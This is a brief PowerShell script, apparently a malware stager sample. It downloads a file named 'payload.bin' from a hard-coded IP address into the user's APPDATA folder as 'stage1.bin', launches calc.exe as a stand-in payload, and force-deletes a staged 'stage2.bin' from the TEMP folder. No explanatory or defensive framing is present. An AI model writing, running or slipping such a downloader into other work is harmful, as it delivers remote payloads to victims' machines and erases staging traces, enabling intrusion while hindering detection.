[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://203.0.113.95/payload.bin",
    [string]$PayloadPath = "$env:APPDATA\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $PayloadPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
